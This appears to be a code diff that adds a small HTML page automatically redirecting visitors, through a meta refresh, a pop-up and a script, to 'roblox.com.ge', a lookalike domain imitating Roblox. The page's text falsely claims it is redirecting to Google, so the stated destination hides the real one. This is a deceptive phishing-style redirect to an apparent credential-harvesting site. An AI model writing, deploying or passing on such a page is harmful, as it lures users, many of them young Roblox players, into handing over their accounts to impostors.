@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="0; url=https://roblox.com.ge/users/7985095887/profile">
+</head>
+<body style="background-color: white;">
+
+    <p>Redirecting to Google... If it doesn't open, 
+       <a href="https://roblox.com.ge/users/7985095887/profile" target="_blank" id="redirect-link">click here</a>.
+    </p>
+
+    <script>
+        // Attempting to open in a new window/tab
+        window.open('https://roblox.com.ge/users/7985095887/profile', '_blank');
+        
+        // Falling back to redirecting the current page if the popup is blocked
+        window.location.href = "https://roblox.com.ge/users/7985095887/profile";
+    </script>
+</body>
+</html>
